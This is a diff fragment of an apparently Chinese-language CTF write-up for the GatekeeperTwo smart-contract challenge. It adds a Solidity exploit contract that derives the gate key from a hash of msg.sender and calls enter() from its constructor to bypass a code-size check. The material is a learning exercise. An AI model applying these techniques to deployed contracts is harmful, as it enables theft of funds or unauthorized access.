@@ -236,7 +236,21 @@ contract Exploit {
 
 ## 4. 攻击方法
 ```
+contract Exploit {
 
+  constructor(address victim) {
+
+    bytes8 result;
+
+    result = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max);
+
+    GatekeeperTwo two = GatekeeperTwo(victim);
+
+    two.enter(result);
+
+  }
+
+}
 ```
 
 ## 5. 攻击调用图
